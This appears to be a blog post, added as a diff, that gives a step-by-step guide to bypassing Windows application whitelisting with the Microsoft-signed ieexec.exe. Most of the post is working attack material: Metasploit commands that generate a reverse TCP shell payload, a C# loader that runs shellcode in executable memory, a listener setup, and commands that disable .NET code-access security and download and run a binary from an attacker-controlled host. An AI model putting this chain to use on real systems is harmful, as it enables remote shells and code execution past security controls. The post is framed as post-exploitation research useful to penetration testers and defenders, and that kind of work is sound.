@@ -1,0 +1,192 @@
+---
+layout: post
+title: "Application Whitelist Bypass using IEexec.exe"
+date: 2014-01-16 12:30:42 -0500
+comments: true
+author: infosecsmith2
+categories: 
+---
+
+## Guest post by [@infosecsmith2](https://twitter.com/infosecsmith2)
+
+There was a recent presentation at DerbyCon, entitled:
+
+[Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation](http://www.youtube.com/watch?v=j-r6UonEkUw)
+by Christopher Campbell & Matthew Graeber
+
+I highly recommend that you start with this presentation as it lays the foundation for this post.
+
+The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.
+
+It is only a matter of time before time before you might encounter an Application Whitelisting Defense.
+
+As a follow up to that presentation, I began exploring the binaries that ship by default with Windows.  That is where I stumbled across a binary in the C:\Windows\Microsoft.NET\Framework64\v2.0.50727 path.
+
+The Executable is ieexec.exe. A write up is here: http://support.microsoft.com/kb/822485
+
+> “The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.”
+
+Excellent! So, now we just need to host our malicious binary , and call it from ieexec.exe.
+
+This is great, since most Application Whitelisting Environments are going to “Trust” anything signed my Microsoft as a matter of convenience. IEexec.exe will download and execute our code for us, all under the trusted process.
+
+So lets get started!
+
+**Step 1.** Prepare your Shellcode, or whatever malicious app you want. I compiled my executable using SharpDevelop, since it has less footprint than a full blown Visual Studio install.
+From msfconsole:
+
+```
+msf > use windows/x64/shell/reverse_tcp
+msf payload(reverse_tcp) > set LHOST x.x.x.x
+msf payload(reverse_tcp) > set LPORT 443
+msf payload(reverse_tcp) > generate -t csharp
+￼
+byte[] buf = new byte[422] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52...
+
+ <Snipped Full ShellCode for Brevity>
+```
+
+**Step 2.** Create the .NET wrapper application
+
+```csharp
+using System; 
+using System.Runtime.InteropServices; 
+namespace native 
+{ 
+    class Program 
+    { 
+            private static UInt32 MEM_COMMIT = 0x1000; 
+            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; 
+            private static UInt32 MEM_RELEASE = 0x8000; 
+
+        public static void Main(string[] args) 
+        { 
+            // native function's compiled code 
+
+            byte[] proc = new byte[] { 
+                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52... 
+            
+            //Edited ShellCode For Brevity 
+            }; 
+
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
+            Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length); 
+            IntPtr hThread = IntPtr.Zero; 
+            UInt32 threadId = 0; 
+
+            // prepare data 
+
+            PROCESSOR_INFO info = new PROCESSOR_INFO(); 
+            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO))); 
+            Marshal.StructureToPtr(info, pinfo, false); 
+            
+            // execute native code 
+
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); 
+            WaitForSingleObject(hThread, 0xFFFFFFFF); 
+
+            // retrive data 
+
+            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO)); 
+            Marshal.FreeHGlobal(pinfo); 
+            CloseHandle(hThread);
+            VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE); 
+        } 
+
+        [DllImport("kernel32")] 
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 
+
+        [DllImport("kernel32")] 
+        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); 
+
+        [DllImport("kernel32")] 
+        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); 
+
+        [DllImport("kernel32")] 
+        private static extern bool CloseHandle(IntPtr handle); 
+
+        [DllImport("kernel32")] 
+        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 
+
+        [DllImport("kernel32")] 
+        private static extern IntPtr GetModuleHandle( string moduleName ); 
+
+        [DllImport("kernel32")] 
+        private static extern UInt32 GetProcAddress( IntPtr hModule, string procName ); 
+
+        [DllImport("kernel32")] 
+        private static extern UInt32 LoadLibrary( string lpFileName ); 
+
+        [DllImport("kernel32")] 
+        private static extern UInt32 GetLastError();
+        
+        [StructLayout(LayoutKind.Sequential)] 
+        internal struct PROCESSOR_INFO 
+        { 
+            public UInt32 dwMax; 
+            public UInt32 id0; 
+            public UInt32 id1; 
+            public UInt32 id2; 
+            public UInt32 dwStandard; 
+            public UInt32 dwFeature; 
+
+            // if AMD 
+            public UInt32 dwExt; 
+        }
+    } 
+}
+```
+
+You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.
+
+**Step 3.** Host the Exe. For this example, I used Mongoose. Simple and Effective:
+
+http://code.google.com/p/mongoose/
+
+By default Mongoose listens on port 8080. This is configurable. Simple place your compiled binary from step 2 into the same directory as Mongoose. Start Mongoose and you are almost ready to deliver your payload.
+
+**Step 4.** Setup your receiver:
+
+```
+msf payload(reverse_tcp) > use exploit/multi/handler
+msf exploit(handler) > set LHOST x.x.x.x
+msf exploit(handler) > set LPORT 443
+msf exploit(handler) > set PAYLOAD windows/x64/shell/reverse_tcp
+msf exploit(handler) > exploit -j
+```
+
+**Step 5.** From the host that is protected via Whitelisting. Open 2 Command Prompts as administrator.
+
+**CMD 1 Execute:**
+```
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727>caspol.exe -s off
+```
+￼
+**CMD 2 Execute:**
+```
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727>ieexec.exe http://x.x.x.x:8080/bypass.exe
+```
+
+There is some detail to unpack here, I can go over later, as to why we need to run caspol.exe. Here’s the behavior I saw in our experimentation with this.
+
+Initial attempt to run our rogue binary fails, since it is unknown/untrusted/unapproved:
+
+![](/images/postimages/201401_whitelisting_1.png)
+
+Now, on the same host...
+
+![](/images/postimages/201401_whitelisting_2.png)
+
+Executes just fine!
+
+![](/images/postimages/201401_whitelisting_3.png)
+
+Its important to distinguish what this technique is and what it is not. This is not an exploit or vulnerability. Rather this is one way to execute arbitraty code in an Application Whitelisting Environment.
+
+**Summary:**
+
+In this document we learned that even if a host is in a mode where only trusted approved applications can run. IEexec.exe can be used in certain situations to circumvent a Whitelist, since it is likely a trusted binary, since it is signed by Microsoft.
+
+Cheers,
+
+=> [@infosecsmith2](https://twitter.com/infosecsmith2)
